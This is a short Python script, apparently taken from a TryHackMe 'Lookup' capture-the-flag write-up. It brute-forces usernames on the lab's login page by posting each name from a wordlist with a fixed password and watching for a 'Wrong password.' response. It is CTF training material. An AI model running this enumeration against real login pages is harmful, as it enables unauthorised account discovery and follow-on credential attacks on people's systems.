#!/usr/bin/python3
# -*- coding: utf-8 -*-
# https://m3n0sd0n4ld.github.io/patoHackventuras/Lookup-tryhackme-writeup

import requests, re, time, sys
from random import randint

url = "http://lookup.thm/login.php"
headers_data = ''

if __name__ == '__main__':
        
        s = requests.session()

        print("[*] User bruteforce starting...")

        fp = open('/usr/share/seclists/Usernames/Names/names.txt', errors='ignore')
        for username in fp.readlines():
                r = s.get(url, verify=False)

                post_data = {
                        'username': '%s' % username.rstrip(),
                        'password': '123456'
                }

                r = s.post(url, data=post_data, headers=headers_data, verify=False)
        
                if "Wrong password." in r.text:
                        print("[+] User found!!!: %s" % username)
                
        fp.close()